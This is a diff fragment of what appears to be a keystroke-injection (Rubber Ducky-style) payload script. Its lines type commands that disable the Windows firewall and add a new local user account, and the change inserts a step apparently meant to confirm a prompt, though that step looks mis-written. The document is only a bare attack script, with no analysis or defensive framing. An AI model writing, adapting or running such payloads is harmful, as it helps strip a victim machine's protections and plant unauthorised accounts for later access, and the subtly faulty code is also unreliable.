@@ -16,6 +16,9 @@ DELAY 400
 STRING netsh firewall set opmode mode=disable
 ENTER
 DELAY 400
+STRING ALT y
+ENTER
+DELAY 400
 STRING net user /add username password
 ENTER
 DELAY 400
